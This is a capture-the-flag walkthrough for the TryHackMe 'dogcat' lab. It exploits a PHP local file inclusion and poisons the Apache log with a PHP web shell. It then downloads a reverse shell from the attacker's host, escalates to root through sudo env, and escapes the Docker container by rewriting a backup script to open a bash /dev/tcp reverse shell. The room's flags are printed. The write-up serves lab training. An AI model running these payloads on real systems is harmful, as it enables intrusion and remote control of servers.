https://tryhackme.com/r/room/dogcat
# IP 
```
10.10.97.188
```
# Recon
## NMAP
```bash
nmap -p- -T4 nmap_ports 10.10.97.188 -v
Discovered open port 22/tcp on 10.10.97.188
Discovered open port 80/tcp on 10.10.97.188

nmap -sV -sC -p22,80 -oN nmap_services 10.10.97.188 -v

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 24:31:19:2a:b1:97:1a:04:4e:2c:36:ac:84:0a:75:87 (RSA)
|   256 21:3d:46:18:93:aa:f9:e7:c9:b5:4c:0f:16:0b:71:e1 (ECDSA)
|_  256 c1:fb:7d:73:2b:57:4a:8b:dc:d7:6f:49:bb:3b:d0:20 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: dogcat
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.38 (Debian)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```
# LFI
`http://10.10.97.188/?view=cat` has LFI vulnerability

`http://10.10.97.188/?view=cat../../../../../etc/passwd` gives following error:
```
Warning: include(cat../../../../../etc/passwd.php): failed to open stream: No such file or directory in /var/www/html/index.php on line 24

Warning: include(): Failed opening 'cat../../../../../etc/passwd.php' for inclusion (include_path='.:/usr/local/lib/php') in /var/www/html/index.php on line 24
```

`http://10.10.97.188/?view=cat../../../../../etc/passwd%00`
```
 Warning: include(): Failed opening 'cat../../../../../etc/passwd' for inclusion (include_path='.:/usr/local/lib/php') in /var/www/html/index.php on line 24
```

`http://10.10.97.188/?view=../../../../../../../../../etc/passwd%00cat`
```
 Warning: include(): Failed opening '../../../../../../../../../etc/passwd' for inclusion (include_path='.:/usr/local/lib/php') in /var/www/html/index.php on line 24
```

`http://10.10.97.188/?view=dog/../cat` returns cat images which may conclude that there is some `cat.php` and `dog.php` and maybe smth else
```bash
dirb 'http://10.10.97.188/?view=dog/../' -f
...
+ http://10.10.97.188/?view=dog/../flag (CODE:200|SIZE:40)
...
```
But it will not open anything. Then, we need to encode the output with `php://filter/read=convert.base64-encode/resource=` 

`http://10.10.97.188/?view=php://filter/read=convert.base64-encode/resource=dog/../flag`
```
 Here you go!PD9waHAKJGZsYWdfMSA9ICJUSE17VGgxc18xc19OMHRfNF9DYXRkb2dfYWI2N2VkZmF9Igo/Pgo=
```
if we decode it, it will give us the flag:
```php
<?php
$flag_1 = "THM{Th1s_1s_N0t_4_Catdog_ab67edfa}"
?>
```

now lets get index page too:
```
 Here you go!PCFET0NUWVBFIEhUTUw+CjxodG1sPgoKPGhlYWQ+CiAgICA8dGl0bGU+ZG9nY2F0PC90aXRsZT4KICAgIDxsaW5rIHJlbD0ic3R5bGVzaGVldCIgdHlwZT0idGV4dC9jc3MiIGhyZWY9Ii9zdHlsZS5jc3MiPgo8L2hlYWQ+Cgo8Ym9keT4KICAgIDxoMT5kb2djYXQ8L2gxPgogICAgPGk+YSBnYWxsZXJ5IG9mIHZhcmlvdXMgZG9ncyBvciBjYXRzPC9pPgoKICAgIDxkaXY+CiAgICAgICAgPGgyPldoYXQgd291bGQgeW91IGxpa2UgdG8gc2VlPzwvaDI+CiAgICAgICAgPGEgaHJlZj0iLz92aWV3PWRvZyI+PGJ1dHRvbiBpZD0iZG9nIj5BIGRvZzwvYnV0dG9uPjwvYT4gPGEgaHJlZj0iLz92aWV3PWNhdCI+PGJ1dHRvbiBpZD0iY2F0Ij5BIGNhdDwvYnV0dG9uPjwvYT48YnI+CiAgICAgICAgPD9waHAKICAgICAgICAgICAgZnVuY3Rpb24gY29udGFpbnNTdHIoJHN0ciwgJHN1YnN0cikgewogICAgICAgICAgICAgICAgcmV0dXJuIHN0cnBvcygkc3RyLCAkc3Vic3RyKSAhPT0gZmFsc2U7CiAgICAgICAgICAgIH0KCSAgICAkZXh0ID0gaXNzZXQoJF9HRVRbImV4dCJdKSA/ICRfR0VUWyJleHQiXSA6ICcucGhwJzsKICAgICAgICAgICAgaWYoaXNzZXQoJF9HRVRbJ3ZpZXcnXSkpIHsKICAgICAgICAgICAgICAgIGlmKGNvbnRhaW5zU3RyKCRfR0VUWyd2aWV3J10sICdkb2cnKSB8fCBjb250YWluc1N0cigkX0dFVFsndmlldyddLCAnY2F0JykpIHsKICAgICAgICAgICAgICAgICAgICBlY2hvICdIZXJlIHlvdSBnbyEnOwogICAgICAgICAgICAgICAgICAgIGluY2x1ZGUgJF9HRVRbJ3ZpZXcnXSAuICRleHQ7CiAgICAgICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgICAgIGVjaG8gJ1NvcnJ5LCBvbmx5IGRvZ3Mgb3IgY2F0cyBhcmUgYWxsb3dlZC4nOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgPz4KICAgIDwvZGl2Pgo8L2JvZHk+Cgo8L2h0bWw+Cg== 
```
after decoding
```php
...
<?php
	function containsStr($str, $substr) {
		return strpos($str, $substr) !== false;
	}
$ext = isset($_GET["ext"]) ? $_GET["ext"] : '.php';
	if(isset($_GET['view'])) {
		if(containsStr($_GET['view'], 'dog') || containsStr($_GET['view'], 'cat')) {
			echo 'Here you go!';
			include $_GET['view'] . $ext;
		} else {
			echo 'Sorry, only dogs or cats are allowed.';
		}
	}
?>
...
```

There is `ext` parameter in addition to `view` parameter, and following payload will work fine
`http://10.10.97.188/?view=dog../../../../../../../etc/passwd&ext=`
```
root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin _apt:x:100:65534::/nonexistent:/usr/sbin/nologin 
```

# RCE
`http://10.10.97.188/?view=dog../../../../../../../var/log/apache2/access.log&ext=` is pretty interesting as it saves `user-agent`s. We may craft a php payload to get cmd. 
```bash
curl -X GET "http://10.10.97.188/" -H 'User-Agent:<?php system($_GET['cmd']);?>' 
```
Now we can RCE with: 
`10.10.97.188/?view=dog../../../../../../../var/log/apache2/access.log&ext=&cmd=<command>`
or, for better experience: `10.10.97.188/?view=dog../../../../../../../var/log/apache2/access.log&ext=&cmd=echo+'<?php system($_GET['cmd']);?>' > cmd.php` and then use only `/cmd.php?cmd=<command>`
# The second flag
`http://10.10.97.188/cmd.php?cmd=cat%20../flag2_QMW7JvaY2LvK.txt` gives
` THM{LF1_t0_RC3_aec3fb} `
# Reverse shell
download https://github.com/pentestmonkey/php-reverse-shell
and transport it onto machine and setup python server `python3 -m http.server`.
to download it the command is: `curl http://10.8.97.245:8000/php-reverse-shell.php > shell.php`
and then navigate to `shell.php` to get reverse shell. 
do not forget to stabilize the shell
```bash
/bin/bash -i
export TERM=xterm
```
# PrivEsc
```bash
sudo -l 
(root) NOPASSWD: /usr/bin/env
# https://gtfobins.github.io/gtfobins/env/#sudo
sudo env /bin/sh

root@91c9dea432b2:~# cat flag3.txt
cat flag3.txt
THM{D1ff3r3nt_3nv1ronments_874112}
```
# break out of a docker container.
it is said in description.
```bash
ls /opt/backups
# backup.sh backup.tar
cat backup.sh
# tar cf /root/container/backup/backup.tar /root/container

echo '#!/bin/bash' > backup.sh
echo "/bin/bash -c 'bash -i >& /dev/tcp/10.8.97.245/4444 0>&1'" >> backup.sh

# nc -lvnp 4444
```
and this will give a reverse shell  

```
root@dogcat:~# ls
ls
container
flag4.txt
root@dogcat:~# cat flag4.txt
cat flag4.txt
THM{esc4l4tions_on_esc4l4tions_on_esc4l4tions_7a52b17dba6ebb0dc38bc1049bcba02d}
```
